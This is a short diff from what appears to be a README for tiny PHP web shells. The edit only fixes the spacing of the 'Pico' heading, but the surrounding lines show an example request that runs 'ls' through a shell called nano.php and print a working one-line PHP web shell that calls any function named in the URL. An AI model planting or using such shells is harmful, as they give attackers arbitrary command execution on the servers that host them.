@@ -26,7 +26,7 @@ For example, the code below will execute the `ls` command:
 
 `http://example.com/nano.php?f=system&c=ls&p=password`
 
-###Pico
+### Pico
 ```php
 <?$x=$_GET;@$x[f]($x[c]);
 ```
